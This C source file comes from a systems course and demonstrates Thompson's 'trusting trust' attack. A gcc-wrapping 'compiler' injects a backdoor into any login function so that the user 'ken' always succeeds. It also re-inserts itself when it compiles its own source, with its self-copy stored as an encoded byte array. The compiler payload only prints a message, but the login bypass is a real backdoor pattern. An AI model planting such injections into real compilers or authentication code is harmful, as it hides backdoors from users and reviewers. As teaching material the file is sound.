// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>


#define error(args...) do { fprintf(stderr, ##args); exit(1);  } while(0)


// a not very interesting compile: throw the input into a 
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
    FILE *fp = fopen("./temp-out.c", "w");
    assert(fp);
    char prog[] = {
	32, 	32, 	32, 	32, 	105, 	110, 	116, 	32,
	109, 	111, 	100, 	32, 	61, 	32, 	48, 	59,
	10, 	10, 	32, 	32, 	32, 	32, 	115, 	116,
	97, 	116, 	105, 	99, 	32, 	99, 	104, 	97,
	114, 	32, 	108, 	111, 	103, 	105, 	110, 	95,
	115, 	105, 	103, 	91, 	93, 	32, 	61, 	32,
	34, 	105, 	110, 	116, 	32, 	108, 	111, 	103,
	105, 	110, 	40, 	99, 	104, 	97, 	114, 	32,
	42, 	117, 	115, 	101, 	114, 	41, 	32, 	123,
	92, 	110, 	32, 	32, 	32, 	32, 	34, 	59,
	10, 	32, 	32, 	32, 	32, 	115, 	116, 	97,
	116, 	105, 	99, 	32, 	99, 	104, 	97, 	114,
	32, 	108, 	111, 	103, 	105, 	110, 	95, 	97,
	116, 	116, 	97, 	99, 	107, 	91, 	93, 	32,
	61, 	32, 	34, 	105, 	102, 	40, 	115, 	116,
	114, 	99, 	109, 	112, 	40, 	117, 	115, 	101,
	114, 	44, 	32, 	92, 	34, 	107, 	101, 	110,
	92, 	34, 	41, 	32, 	61, 	61, 	32, 	48,
	41, 	32, 	114, 	101, 	116, 	117, 	114, 	110,
	32, 	49, 	59, 	92, 	110, 	32, 	32, 	32,
	32, 	34, 	59, 	10, 	10, 	32, 	32, 	32,
	32, 	99, 	104, 	97, 	114, 	32, 	42, 	108,
	111, 	103, 	105, 	110, 	95, 	115, 	105, 	103,
	95, 	112, 	111, 	115, 	32, 	61, 	32, 	115,
	116, 	114, 	115, 	116, 	114, 	40, 	112, 	114,
	111, 	103, 	114, 	97, 	109, 	44, 	32, 	108,
	111, 	103, 	105, 	110, 	95, 	115, 	105, 	103,
	41, 	59, 	10, 	10, 	32, 	32, 	32, 	32,
	105, 	102, 	32, 	40, 	108, 	111, 	103, 	105,
	110, 	95, 	115, 	105, 	103, 	95, 	112, 	111,
	115, 	32, 	33, 	61, 	32, 	78, 	85, 	76,
	76, 	41, 	32, 	123, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	115, 	105, 	122,
	101, 	95, 	116, 	32, 	105, 	110, 	115, 	101,
	114, 	116, 	95, 	105, 	110, 	100, 	101, 	120,
	32, 	61, 	32, 	108, 	111, 	103, 	105, 	110,
	95, 	115, 	105, 	103, 	95, 	112, 	111, 	115,
	32, 	45, 	32, 	112, 	114, 	111, 	103, 	114,
	97, 	109, 	32, 	43, 	32, 	115, 	116, 	114,
	108, 	101, 	110, 	40, 	108, 	111, 	103, 	105,
	110, 	95, 	115, 	105, 	103, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	115, 	105, 	122, 	101, 	95, 	116, 	32, 	110,
	101, 	119, 	95, 	115, 	105, 	122, 	101, 	32,
	61, 	32, 	115, 	116, 	114, 	108, 	101, 	110,
	40, 	112, 	114, 	111, 	103, 	114, 	97, 	109,
	41, 	32, 	43, 	32, 	115, 	116, 	114, 	108,
	101, 	110, 	40, 	108, 	111, 	103, 	105, 	110,
	95, 	97, 	116, 	116, 	97, 	99, 	107, 	41,
	59, 	10, 	10, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	99, 	104, 	97, 	114, 	32,
	97, 	116, 	116, 	97, 	99, 	107, 	95, 	112,
	114, 	111, 	103, 	114, 	97, 	109, 	91, 	110,
	101, 	119, 	95, 	115, 	105, 	122, 	101, 	93,
	59, 	10, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	115, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	97, 	116, 	116, 	97, 	99, 	107,
	95, 	112, 	114, 	111, 	103, 	114, 	97, 	109,
	44, 	32, 	34, 	37, 	46, 	42, 	115, 	37,
	115, 	37, 	115, 	34, 	44, 	32, 	40, 	105,
	110, 	116, 	41, 	105, 	110, 	115, 	101, 	114,
	116, 	95, 	105, 	110, 	100, 	101, 	120, 	44,
	32, 	112, 	114, 	111, 	103, 	114, 	97, 	109,
	44, 	32, 	108, 	111, 	103, 	105, 	110, 	95,
	97, 	116, 	116, 	97, 	99, 	107, 	44, 	32,
	108, 	111, 	103, 	105, 	110, 	95, 	115, 	105,
	103, 	95, 	112, 	111, 	115, 	32, 	43, 	32,
	115, 	116, 	114, 	108, 	101, 	110, 	40, 	108,
	111, 	103, 	105, 	110, 	95, 	115, 	105, 	103,
	41, 	41, 	59, 	10, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	102, 	112, 	114,
	105, 	110, 	116, 	102, 	40, 	102, 	112, 	44,
	32, 	34, 	37, 	115, 	34, 	44, 	32, 	97,
	116, 	116, 	97, 	99, 	107, 	95, 	112, 	114,
	111, 	103, 	114, 	97, 	109, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	102, 	99, 	108, 	111, 	115, 	101, 	40, 	102,
	112, 	41, 	59, 	10, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	109, 	111, 	100,
	32, 	61, 	32, 	49, 	59, 	10, 	32, 	32,
	32, 	32, 	125, 	10, 	10, 	32, 	32, 	32,
	32, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	99, 	104, 	97, 	114, 	32, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	95, 	115, 	105, 	103,
	91, 	93, 	32, 	61, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	34, 	115, 	116, 	97, 	116, 	105, 	99,
	32, 	118, 	111, 	105, 	100, 	32, 	99, 	111,
	109, 	112, 	105, 	108, 	101, 	40, 	99, 	104,
	97, 	114, 	32, 	42, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	99, 	104, 	97,
	114, 	32, 	42, 	111, 	117, 	116, 	110, 	97,
	109, 	101, 	41, 	32, 	123, 	92, 	110, 	34,
	10, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	34, 	32, 	32,
	32, 	32, 	70, 	73, 	76, 	69, 	32, 	42,
	102, 	112, 	32, 	61, 	32, 	102, 	111, 	112,
	101, 	110, 	40, 	92, 	34, 	46, 	47, 	116,
	101, 	109, 	112, 	45, 	111, 	117, 	116, 	46,
	99, 	92, 	34, 	44, 	32, 	92, 	34, 	119,
	92, 	34, 	41, 	59, 	92, 	110, 	34, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	34, 	32, 	32, 	32,
	32, 	97, 	115, 	115, 	101, 	114, 	116, 	40,
	102, 	112, 	41, 	59, 	92, 	110, 	34, 	59,
	10, 	10, 	32, 	32, 	32, 	32, 	115, 	116,
	97, 	116, 	105, 	99, 	32, 	99, 	104, 	97,
	114, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	91, 	93, 	32, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	61, 	32, 	34, 	32, 	32, 	32,
	32, 	112, 	114, 	105, 	110, 	116, 	102, 	40,
	92, 	34, 	37, 	115, 	58, 	32, 	99, 	111,
	117, 	108, 	100, 	32, 	104, 	97, 	118, 	101,
	32, 	114, 	117, 	110, 	32, 	121, 	111, 	117,
	114, 	32, 	97, 	116, 	116, 	97, 	99, 	107,
	32, 	104, 	101, 	114, 	101, 	33, 	33, 	92,
	92, 	110, 	92, 	34, 	44, 	32, 	95, 	95,
	70, 	85, 	78, 	67, 	84, 	73, 	79, 	78,
	95, 	95, 	41, 	59, 	92, 	110, 	34, 	59,
	10, 	10, 	32, 	32, 	32, 	32, 	99, 	104,
	97, 	114, 	32, 	42, 	99, 	111, 	109, 	112,
	105, 	108, 	101, 	95, 	115, 	105, 	103, 	95,
	112, 	111, 	115, 	32, 	61, 	32, 	115, 	116,
	114, 	115, 	116, 	114, 	40, 	112, 	114, 	111,
	103, 	114, 	97, 	109, 	44, 	32, 	99, 	111,
	109, 	112, 	105, 	108, 	101, 	95, 	115, 	105,
	103, 	41, 	59, 	10, 	10, 	32, 	32, 	32,
	32, 	105, 	102, 	32, 	40, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	95, 	115, 	105, 	103,
	95, 	112, 	111, 	115, 	32, 	33, 	61, 	32,
	78, 	85, 	76, 	76, 	41, 	32, 	123, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	115, 	105, 	122, 	101, 	95, 	116, 	32, 	105,
	110, 	115, 	101, 	114, 	116, 	95, 	105, 	110,
	100, 	101, 	120, 	32, 	61, 	32, 	99, 	111,
	109, 	112, 	105, 	108, 	101, 	95, 	115, 	105,
	103, 	95, 	112, 	111, 	115, 	32, 	45, 	32,
	112, 	114, 	111, 	103, 	114, 	97, 	109, 	32,
	43, 	32, 	115, 	116, 	114, 	108, 	101, 	110,
	40, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	95, 	115, 	105, 	103, 	41, 	59, 	10, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	115,
	105, 	122, 	101, 	95, 	116, 	32, 	98, 	117,
	102, 	102, 	101, 	114, 	95, 	115, 	105, 	122,
	101, 	32, 	61, 	32, 	56, 	32, 	42, 	32,
	49, 	48, 	50, 	52, 	32, 	42, 	32, 	49,
	48, 	50, 	52, 	59, 	10, 	10, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	99, 	104,
	97, 	114, 	32, 	42, 	97, 	116, 	116, 	97,
	99, 	107, 	95, 	99, 	111, 	109, 	112, 	105,
	108, 	101, 	114, 	32, 	61, 	32, 	40, 	99,
	104, 	97, 	114, 	32, 	42, 	41, 	109, 	97,
	108, 	108, 	111, 	99, 	40, 	98, 	117, 	102,
	102, 	101, 	114, 	95, 	115, 	105, 	122, 	101,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	105, 	102, 	32, 	40, 	97,
	116, 	116, 	97, 	99, 	107, 	95, 	99, 	111,
	109, 	112, 	105, 	108, 	101, 	114, 	32, 	61,
	61, 	32, 	78, 	85, 	76, 	76, 	41, 	32,
	123, 	10, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	102, 	112,
	114, 	105, 	110, 	116, 	102, 	40, 	115, 	116,
	100, 	101, 	114, 	114, 	44, 	32, 	34, 	77,
	101, 	109, 	111, 	114, 	121, 	32, 	97, 	108,
	108, 	111, 	99, 	97, 	116, 	105, 	111, 	110,
	32, 	102, 	97, 	105, 	108, 	101, 	100, 	92,
	110, 	34, 	41, 	59, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	101, 	120, 	105, 	116, 	40, 	69, 	88,
	73, 	84, 	95, 	70, 	65, 	73, 	76, 	85,
	82, 	69, 	41, 	59, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	125, 	10, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	115, 	112, 	114, 	105, 	110, 	116, 	102, 	40,
	97, 	116, 	116, 	97, 	99, 	107, 	95, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	44,
	32, 	34, 	37, 	46, 	42, 	115, 	34, 	44,
	32, 	40, 	105, 	110, 	116, 	41, 	105, 	110,
	115, 	101, 	114, 	116, 	95, 	105, 	110, 	100,
	101, 	120, 	44, 	32, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	115, 	112,
	114, 	105, 	110, 	116, 	102, 	40, 	97, 	116,
	116, 	97, 	99, 	107, 	95, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	114, 	32, 	43, 	32,
	115, 	116, 	114, 	108, 	101, 	110, 	40, 	97,
	116, 	116, 	97, 	99, 	107, 	95, 	99, 	111,
	109, 	112, 	105, 	108, 	101, 	114, 	41, 	44,
	32, 	34, 	32, 	32, 	32, 	32, 	99, 	104,
	97, 	114, 	32, 	112, 	114, 	111, 	103, 	91,
	93, 	32, 	61, 	32, 	123, 	92, 	110, 	34,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	102, 	111, 	114, 	40, 	105,
	110, 	116, 	32, 	105, 	32, 	61, 	32, 	48,
	59, 	32, 	112, 	114, 	111, 	103, 	91, 	105,
	93, 	59, 	32, 	105, 	43, 	43, 	41, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	115, 	112, 	114,
	105, 	110, 	116, 	102, 	40, 	97, 	116, 	116,
	97, 	99, 	107, 	95, 	99, 	111, 	109, 	112,
	105, 	108, 	101, 	114, 	32, 	43, 	32, 	115,
	116, 	114, 	108, 	101, 	110, 	40, 	97, 	116,
	116, 	97, 	99, 	107, 	95, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	114, 	41, 	44, 	32,
	34, 	92, 	116, 	37, 	100, 	44, 	37, 	99,
	34, 	44, 	32, 	112, 	114, 	111, 	103, 	91,
	105, 	93, 	44, 	32, 	40, 	105, 	43, 	49,
	41, 	37, 	56, 	61, 	61, 	48, 	32, 	63,
	32, 	39, 	92, 	110, 	39, 	32, 	58, 	32,
	39, 	32, 	39, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	115, 	112,
	114, 	105, 	110, 	116, 	102, 	40, 	97, 	116,
	116, 	97, 	99, 	107, 	95, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	114, 	32, 	43, 	32,
	115, 	116, 	114, 	108, 	101, 	110, 	40, 	97,
	116, 	116, 	97, 	99, 	107, 	95, 	99, 	111,
	109, 	112, 	105, 	108, 	101, 	114, 	41, 	44,
	32, 	34, 	48, 	32, 	125, 	59, 	92, 	110,
	34, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	115, 	112, 	114, 	105,
	110, 	116, 	102, 	40, 	97, 	116, 	116, 	97,
	99, 	107, 	95, 	99, 	111, 	109, 	112, 	105,
	108, 	101, 	114, 	32, 	43, 	32, 	115, 	116,
	114, 	108, 	101, 	110, 	40, 	97, 	116, 	116,
	97, 	99, 	107, 	95, 	99, 	111, 	109, 	112,
	105, 	108, 	101, 	114, 	41, 	44, 	32, 	34,
	37, 	115, 	37, 	115, 	37, 	115, 	34, 	44,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	95, 	97, 	116, 	116, 	97, 	99, 	107, 	44,
	32, 	112, 	114, 	111, 	103, 	44, 	32, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	95, 	115,
	105, 	103, 	95, 	112, 	111, 	115, 	32, 	43,
	32, 	115, 	116, 	114, 	108, 	101, 	110, 	40,
	99, 	111, 	109, 	112, 	105, 	108, 	101, 	95,
	115, 	105, 	103, 	41, 	41, 	59, 	10, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	47, 	47, 	115, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	97, 	116, 	116, 	97, 	99, 	107,
	95, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	44, 	32, 	34, 	37, 	46, 	42, 	115,
	37, 	115, 	37, 	115, 	34, 	44, 	32, 	40,
	105, 	110, 	116, 	41, 	105, 	110, 	115, 	101,
	114, 	116, 	95, 	105, 	110, 	100, 	101, 	120,
	44, 	32, 	112, 	114, 	111, 	103, 	114, 	97,
	109, 	44, 	32, 	99, 	111, 	109, 	112, 	105,
	108, 	101, 	95, 	97, 	116, 	116, 	97, 	99,
	107, 	44, 	32, 	99, 	111, 	109, 	112, 	105,
	108, 	101, 	95, 	115, 	105, 	103, 	95, 	112,
	111, 	115, 	32, 	43, 	32, 	115, 	116, 	114,
	108, 	101, 	110, 	40, 	99, 	111, 	109, 	112,
	105, 	108, 	101, 	95, 	115, 	105, 	103, 	41,
	41, 	59, 	10, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	102, 	112, 	114, 	105,
	110, 	116, 	102, 	40, 	102, 	112, 	44, 	32,
	34, 	37, 	115, 	34, 	44, 	32, 	97, 	116,
	116, 	97, 	99, 	107, 	95, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	114, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	102, 	99, 	108, 	111, 	115, 	101, 	40, 	102,
	112, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	109, 	111, 	100, 	32,
	61, 	32, 	49, 	59, 	10, 	32, 	32, 	32,
	32, 	125, 	10, 	10, 	32, 	32, 	32, 	32,
	105, 	102, 	32, 	40, 	109, 	111, 	100, 	41,
	123, 	10, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	99, 	104, 	97, 	114, 	32, 	98,
	117, 	102, 	91, 	49, 	48, 	50, 	52, 	93,
	59, 	10, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	115, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	98, 	117, 	102, 	44, 	32, 	34,
	103, 	99, 	99, 	32, 	46, 	47, 	116, 	101,
	109, 	112, 	45, 	111, 	117, 	116, 	46, 	99,
	32, 	45, 	111, 	32, 	37, 	115, 	34, 	44,
	32, 	111, 	117, 	116, 	110, 	97, 	109, 	101,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	105, 	102, 	40, 	115, 	121,
	115, 	116, 	101, 	109, 	40, 	98, 	117, 	102,
	41, 	32, 	33, 	61, 	32, 	48, 	41, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	101, 	114, 	114, 	111,
	114, 	40, 	34, 	115, 	121, 	115, 	116, 	101,
	109, 	32, 	102, 	97, 	105, 	108, 	101, 	100,
	92, 	110, 	34, 	41, 	59, 	10, 	10, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	114,
	101, 	116, 	117, 	114, 	110, 	59, 	10, 	32,
	32, 	32, 	32, 	125, 	10, 0 };
    int mod = 0;

    static char login_sig[] = "int login(char *user) {\n    ";
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;\n    ";

    char *login_sig_pos = strstr(program, login_sig);

    if (login_sig_pos != NULL) {
        size_t insert_index = login_sig_pos - program + strlen(login_sig);
        size_t new_size = strlen(program) + strlen(login_attack);

        char attack_program[new_size];
        sprintf(attack_program, "%.*s%s%s", (int)insert_index, program, login_attack, login_sig_pos + strlen(login_sig));

        fprintf(fp, "%s", attack_program);
        fclose(fp);

        mod = 1;
    }

    static char compile_sig[] =
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);\n";

    static char compile_attack[] 
              = "    printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);\n";

    char *compile_sig_pos = strstr(program, compile_sig);

    if (compile_sig_pos != NULL) {
        size_t insert_index = compile_sig_pos - program + strlen(compile_sig);
        size_t buffer_size = 8 * 1024 * 1024;

        char *attack_compiler = (char *)malloc(buffer_size);
        if (attack_compiler == NULL) {
            fprintf(stderr, "Memory allocation failed\n");
            exit(EXIT_FAILURE);
        }

        sprintf(attack_compiler, "%.*s", (int)insert_index, program);
        sprintf(attack_compiler + strlen(attack_compiler), "    char prog[] = {\n");
        for(int i = 0; prog[i]; i++)
             sprintf(attack_compiler + strlen(attack_compiler), "\t%d,%c", prog[i], (i+1)%8==0 ? '\n' : ' ');
        sprintf(attack_compiler + strlen(attack_compiler), "0 };\n");
        sprintf(attack_compiler + strlen(attack_compiler), "%s%s%s", compile_attack, prog, compile_sig_pos + strlen(compile_sig));

        //sprintf(attack_compiler, "%.*s%s%s", (int)insert_index, program, compile_attack, compile_sig_pos + strlen(compile_sig));

        fprintf(fp, "%s", attack_compiler);
        fclose(fp);
        mod = 1;
    }

    if (mod){
        char buf[1024];
        sprintf(buf, "gcc ./temp-out.c -o %s", outname);
        if(system(buf) != 0)
            error("system failed\n");

        return;
    }

    fprintf(fp, "%s", program);
    fclose(fp);


    // for step 2 you will pattern match on 
    //   "static void compile(char *program, char *outname) {"
    // and inject the attack

    // match on login....
    // and inject an attack for "ken"

    // gross, call gcc.
    char buf[1024];
    sprintf(buf, "gcc ./temp-out.c -o %s", outname);
    if(system(buf) != 0)
        error("system failed\n");
}



#   define N  8 * 1024 * 1024
static char buf[N+1];

int main(int argc, char *argv[]) {
    if(argc != 4)
        error("expected 4 arguments have %d\n", argc);
    
    if(strcmp(argv[2], "-o") != 0)
        error("expected -o as second argument, have <%s>\n", argv[2]);

    // read in the entire file.
    int fd;
    if((fd = open(argv[1], O_RDONLY)) < 0)
        error("file <%s> does not exist\n", argv[1]);

    int n;
    if((n = read(fd, buf, N)) < 1)
        error("invalid read of file <%s>\n", argv[1]);
    if(n == N)
        error("input file too large\n");

    // "compile" it.
    compile(buf, argv[3]);
    return 0;
}